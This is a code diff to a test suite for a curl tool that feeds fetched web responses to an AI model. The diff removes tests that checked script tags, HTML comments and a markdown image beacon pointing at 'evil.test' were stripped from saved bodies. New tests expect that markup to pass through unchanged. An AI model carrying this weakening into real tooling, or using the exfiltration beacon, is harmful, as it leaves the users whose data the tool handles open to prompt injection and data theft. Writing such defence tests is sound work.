@@ -43,16 +43,12 @@ vi.mock("../security/index.js", async () => {
 vi.mock("../execution/index.js", async () => {
     const actual =
         await vi.importActual<typeof import("../execution/index.js")>("../execution/index.js");
-    // **`platformSupportsHeaderDump` is pinned, and without it this suite was
-    // green only on darwin.** `curl-execute.ts` takes the `headersUnsupported`
-    // branch on any other host, so `responseHeaders` is undefined, only one
-    // content entry is emitted, and the two-region cases below fail on a Linux
-    // runner. Both sibling suites pin it and both say why; this one adopted
-    // neither and the omission was invisible because the shared fixture supplies
-    // `headerBytes` unconditionally.
-    //
-    // Worth stating plainly: the assertions it silently skipped are the ones
-    // that would have caught the notice-prefix splice (`LESSONS.md` RC-41).
+    // **`platformSupportsHeaderDump` is pinned:** without it `curl-execute.ts`
+    // takes the `headersUnsupported` branch on any non-darwin host, so
+    // `responseHeaders` is undefined, only one content entry is emitted, and the
+    // two-region cases below fail on a Linux runner. Both sibling suites pin it
+    // for the same reason. The assertions it guards are the ones that catch the
+    // notice-prefix splice (`LESSONS.md` RC-46).
     return { ...actual, executeCommand: vi.fn(), platformSupportsHeaderDump: () => true };
 });
 
@@ -76,7 +72,14 @@ afterAll(async () => {
     await Promise.all(written.map((f) => rm(f, { force: true })));
 });
 
-/** The body as the model actually receives it: entry 0, after the wrap's shape. */
+/**
+ * The body's slot in the returned content array — entry 0.
+ *
+ * This calls `executeCurlRequest` directly, so the text here is
+ * `processResponse`'s own output, not what the model receives through the
+ * shipped path — the wrap is applied by `registerCurlToolWithHooks`, and
+ * `register-all-tools.test.ts` is what exercises that boundary.
+ */
 const bodyOf = (result: { content: Array<{ text: string }> }) => result.content[0]!.text;
 
 async function fetchBody(
@@ -114,9 +117,10 @@ describe("018 AC1 — a JSON body survives byte for byte", () => {
         ["non-ASCII keys", '{"ключ":"значение","日本":"語"}'],
         // **Escaped, because that is the only form that reaches a parser.** An
         // unescaped lone surrogate in this source becomes U+FFFD the moment the
-        // fixture encodes it to a Buffer, so the first draft of this case tested
-        // the encoder rather than the defence. `JSON.parse` tolerates the escape
-        // and `JSON.stringify` re-emits it, which is where the bytes used to move.
+        // fixture encodes it to a Buffer, so an unescaped form would test the
+        // encoder rather than the defence. `JSON.parse` tolerates the escape and
+        // a re-serialising defence would re-emit it differently — which is the
+        // regression this shape is chosen to catch.
         ["escaped lone surrogate", '{"s":"\\ud800"}'],
         // Markup inside a value is legitimate string content in an API payload,
         // and rewriting it was what the strip stages did on this path.
@@ -159,8 +163,8 @@ describe("018 AC2 — the declared content type selects nothing", () => {
         "application/octet-stream",
         "text/plain",
         // Malformed: `MEDIA_TYPE_HEAD` rejects it, so it arrives as `undefined`
-        // with `contentTypeUndetermined` still false — the asymmetry RC-31 is
-        // about, and the arm that used to take the strictest grammar.
+        // with `contentTypeUndetermined` still false — the asymmetry
+        // `LESSONS.md` RC-31 names. The declared type selects nothing regardless.
         "text/markdown;;",
         // The origin sent none at all.
         "",
@@ -184,7 +188,7 @@ describe("018 AC3/AC4/AC5 — a non-JSON body is reported, not inlined", () => {
         const text = await fetchBody(`<html><body>${SECRET}</body></html>`, "text/html");
         expect(text).not.toContain(SECRET);
         expect(text).toContain("looks-like-markup");
-        expect(text).toContain("not a JSON object or array");
+        expect(text).toContain("not JSON");
         savedPathFrom(text);
     });
 
@@ -204,46 +208,26 @@ describe("018 AC3/AC4/AC5 — a non-JSON body is reported, not inlined", () => {
         savedPathFrom(text);
     });
 
+    // A scalar parses, so it IS JSON: the round trip is a validity check, and
+    // what comes back is the payload the origin sent. An endpoint answering
+    // `null` for "no record" is the case that made this worth changing — it used
+    // to write a file `jq_query` cannot even open, because a top-level scalar has
+    // no path to address (`jq/filter.ts` refuses a pathless filter).
     for (const [name, body] of [
         ["null", "null"],
         ["a number", "42"],
         ["a quoted string", '"x"'],
-        // The dangerous one. `isDefinitelyJson` answers TRUE here, because
-        // `JSON_DOCUMENT_FIRST_CHARS` admits `"` — so an artefact gate built on
-        // that predicate would have persisted raw origin octets for a body whose
-        // only reader is the host's own file tooling.
+        // Returned as sent, markup and all. The population this proxy serves is
+        // internal staff querying their own APIs; a body they asked for is not
+        // rewritten on the way back.
         ["a quoted script tag", '"<script>x</script>"'],
     ] as Array<[string, string]>) {
-        it(`treats ${name} as non-JSON (AC5)`, async () => {
+        it(`returns ${name} inline, byte for byte (AC5)`, async () => {
             const text = await fetchBody(body, "application/json");
-            expect(text).toContain("bare-scalar");
-            savedPathFrom(text);
+            expect(text).toBe(body);
+            expect(text).not.toContain("saved to:");
         });
     }
-
-    it("actually STRIPS a bare-scalar body's markup before persisting it", async () => {
-        // **This is the case the AC5 loop above could not see, and the gap was
-        // real.** Those cases assert the *report* names `bare-scalar`; none of
-        // them reads the file. A bare-scalar JSON body took
-        // `defendText(…, { contentTypeUndetermined: true })` and no strip stage
-        // ran, because `defendText` re-asked the JSON question with the looser
-        // `isDefinitelyJson` — for which `'"<script>x</script>"'` is TRUE — and
-        // that cancelled the strictest grammar the call had requested.
-        //
-        // Meanwhile `savedMessage` told the model those bytes "have been through
-        // the full defence pipeline". So the artefact is what has to be asserted,
-        // not the sentence describing it.
-        for (const [name, body, forbidden] of [
-            ["script tag", '"<script>alert(1)</script>"', "<script"],
-            ["markdown beacon", '"![x](https://evil.test/?d=stolen)"', "evil.test"],
-            ["html comment", '"a <!-- b --> c"', "<!--"],
-        ] as Array<[string, string, string]>) {
-            const text = await fetchBody(body, "application/json");
-            expect(text).toContain("bare-scalar");
-            const onDisk = await readFile(savedPathFrom(text), "utf-8");
-            expect(onDisk, `${name} survived into the artefact`).not.toContain(forbidden);
-        }
-    });
 
     it("reports the byte count and the path, and echoes NO remote token", async () => {
         // **The declared content type is deliberately absent from this
@@ -265,12 +249,15 @@ describe("018 AC3/AC4/AC5 — a non-JSON body is reported, not inlined", () => {
         savedPathFrom(text);
     });
 
-    it("says plainly that the saved non-JSON bytes are not the origin's exact bytes", async () => {
-        // The honest half of the artefact split: this arm is defended text, so a
-        // caller must not read it as a faithful copy.
-        const text = await fetchBody("<html><!-- x --></html>", "text/html");
-        expect(text).toContain("not the origin's exact bytes");
-        savedPathFrom(text);
+    it("saves a non-JSON body as the origin's exact bytes, diagnostics intact", async () => {
+        // The reason this arm stopped defending the artefact: `stripHtmlComments`
+        // deletes the `<!-- trace-id -->` a framework puts its diagnostic in, and
+        // that comment is the most useful thing on a 500 page.
+        const page = "<html><!-- trace-id: 7f3a91c2 --><h1>Application Error</h1></html>";
+        const text = await fetchBody(page, "text/html");
+        expect(text).toContain("the origin's exact bytes");
+        const onDisk = await readFile(savedPathFrom(text), "utf-8");
+        expect(onDisk).toBe(page);
     });
 });
 
@@ -416,16 +403,18 @@ describe("018 AC6 — the artefact gate is the body gate, with no strip cap", ()
         expect(onDisk.includes(Buffer.from([0xef, 0xbf, 0xbd]))).toBe(false);
     });
 
-    it("takes the non-JSON arm for a 600 KB BARE-STRING body and writes DEFENDED text", async () => {
+    it("persists a 600 KB bare string on the JSON arm, sanitised because Step 2 fired", async () => {
         const filler = "y".repeat(600_000);
         const body = `"${filler}a${ZWSP}b"`;
         const text = await fetchBody(body, "application/json");
-        // `isDefinitelyJson` says TRUE for this body — `JSON_DOCUMENT_FIRST_CHARS`
-        // admits `"` — which is why the artefact gate must not be built on it.
-        expect(text).toContain("bare-scalar");
+        // A scalar is JSON, so there is no rejection to report — only the cap.
+        expect(text).not.toContain("is not JSON");
+        expect(text).toContain("inline limit");
+        // **The one case where the artefact is NOT the origin's octets.** Step 2
+        // removed the ZWSP, so writing the raw octets would put a byte on disk
+        // that the sanitised inline copy does not have.
         const onDisk = await readFile(savedPathFrom(text));
         expect(onDisk.equals(Buffer.from(body, "utf8"))).toBe(false);
-        // The specific difference: Step 2 ran, so this is not raw origin octets.
         expect(onDisk.toString("utf8")).not.toContain(ZWSP);
     });
 });
@@ -475,9 +464,9 @@ describe("018 — two remote regions, two content entries", () => {
 
     // -----------------------------------------------------------------------
     // The notice is a THIRD region, and it was the second join in one function.
-    // One case per trigger, because each is reached by a different flag and the
-    // one that used to be covered was neutralised by a platform mock.
-    // `LESSONS.md` RC-41.
+    // One case per trigger, because each is reached by a different flag — and a
+    // missing platform pin silently neutralises either one's coverage.
+    // `LESSONS.md` RC-46.
     // -----------------------------------------------------------------------
     for (const [trigger, fixture] of [
         ["non-zero cURL exit", { exitCode: 18 }],
